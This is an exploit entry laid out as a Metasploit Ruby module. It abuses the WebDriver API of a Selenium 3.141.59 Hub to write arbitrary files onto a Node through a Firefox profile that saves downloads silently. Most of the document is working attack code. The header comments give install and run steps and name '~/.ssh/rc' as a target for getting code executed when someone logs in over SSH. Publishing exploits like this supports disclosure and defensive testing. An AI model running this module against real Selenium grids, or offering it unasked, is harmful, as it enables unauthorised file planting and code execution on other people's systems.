# Exploit Title: Selenium Node Upload
# Date: 3/7/2021
# Exploit Author: Jon Statton
# Vendor Homepage: https://www.selenium.dev/
# Software Link: https://selenium-release.storage.googleapis.com/3.141/selenium-server-standalone-3.141.59.jar
# Version: 3.141.59
# Tested on: 3.141.59 + Firefox(geckodriver)

# I think the download and upload of files on a Selenium Node should be turned off by default on the Hub level. It should be something that has to be turned on explicitly, maybe with some type of authorization.

# DESCRIPTION: This basically creates a Firefox profile that sets a new download directory and turns off the prompt to save files (based on MIME type). It then runs a selenium test with an inline html download link and clicks it to save the file. If a local file is used, then the download link will simple be the file base64 encoded. For large files, it would be best to pass in a URL link to a file rather than a local file on the file system. Currently, this is only written for Geckodriver/Firefox. But similar options seem possible for all common browsers that have a Webdriver. Some limitations are that it cannot currently overwrite files, or create dot files. One example target for a POC could be "~/.ssh/rc"; which is a file that gets executed on a new SSH login.

# INSTALL: To install copy this to "~/.msf4/modules/exploits/multi/http/" or whatever.

# RUN: Set "URL" to the HUB URL (Should look like http://selenium-hub.lan:4444/wd/hub). Set "REMOTE_FILE" to the path and name of file on the NODE (example: /tmp/blah.txt). Set either "LOCAL_FILE" to a full path and name of a file on the local filesystem.

require 'base64'

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Selenium Node Upload',
      'Description'    => %q{
        Use the browser(Firefox) on a Selenium Node to upload a file.
        The upload location will create any directories that do not exist. Including dotfile directories.
        This cannot (yet): 1. Overwrite a file. 2. Upload a dotfile.
      },
      'License'        => MSF_LICENSE,
      'Author'         => [ 'Jon Stratton' ],
      'References'     =>
        [
          [ 'URL', 'https://github.com/JonStratton/selenium-node-takeover-kit' ]
        ],
      'Platform'       => 'misc',
      'Targets'       => [
        [
          'Native Payload', {
            'Platform' => %w{ linux osx win unix },
            'Arch'     => ARCH_ALL
          }
        ]
      ],
      'Privileged'     => false,
      'DisclosureDate' => "Oct ?? 2020",
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The Selenium Hub URL. http://selenium-hub.lan:4444/wd/hub']),
        OptString.new('REMOTE_FILE', [true, 'The remote destination of the uploaded file.']),
        OptString.new('LOCAL_FILE', [false, 'The local file to upload.']),
      ])
  end

  def exploit
    remote_file = datastore['REMOTE_FILE']
    local_file = datastore['LOCAL_FILE']

    href = 'data:application/octet-stream;charset=utf-16le;base64,%s' % [Base64.encode64( File.read(local_file) )]

    data_url = 'data:text/html;charset=utf-8,<html><a id=f href="%s" download="%s">f</a></html>' % [href, File::basename(remote_file)]

    # Build profile zip file.
    stringio = Zip::OutputStream::write_buffer do |io|
      # Allows us to download files without being prompted.
      io.put_next_entry("prefs.js")
      io.write('user_pref("browser.download.dir", "%s");
user_pref("browser.download.folderList", 2);
user_pref("browser.helperApps.neverAsk.saveToDisk", "application/octet-stream;");' % [File::dirname(remote_file)])
    end
    stringio.rewind
    encoded_profile = Base64.strict_encode64(stringio.sysread)

    # Create session with our new profile
    newSession = {:desiredCapabilities => {:browserName => "firefox", :firefox_profile => encoded_profile}}

    uri = URI.parse(target_uri)
    http = Net::HTTP.new(uri.host, uri.port)

    # Start session with encoded_profile and save session id for cleanup.
    uri = URI.parse("%s/session" % [target_uri])
    request = Net::HTTP::Post.new(uri.request_uri, 'Content-Type' => 'application/json; charset=utf-8')
    request.body = JSON.generate(newSession)
    response = http.request(request)
    sessionId = JSON.parse(response.body)["value"]["sessionId"] ? JSON.parse(response.body)["value"]["sessionId"] : JSON.parse(response.body)["sessionId"]

    # URL.
    uri = URI.parse("%s/session/%s/url" % [target_uri, sessionId])
    request = Net::HTTP::Post.new(uri.request_uri, 'Content-Type' => 'application/json; charset=utf-8')
    request.body = JSON.generate(:url => data_url)
    response = http.request(request)

    # Element.
    uri = URI.parse("%s/session/%s/element" % [target_uri, sessionId])
    request = Net::HTTP::Post.new(uri.request_uri, 'Content-Type' => 'application/json; charset=utf-8')
    request.body = JSON.generate(:using => 'css selector', :value => '#f')
    response = http.request(request)
    elementId = JSON.parse(response.body)["value"].values[0]

    # Element Click.
    uri = URI.parse("%s/session/%s/element/%s/click" % [target_uri, sessionId, elementId])
    request = Net::HTTP::Post.new(uri.request_uri, 'Content-Type' => 'application/json; charset=utf-8')
    request.body = JSON.generate({})
    response = http.request(request)

    # End session
    uri = URI.parse("%s/session/%s" % [target_uri, sessionId])
    request = Net::HTTP::Delete.new(uri.request_uri)
    http.request(request)
  end

end
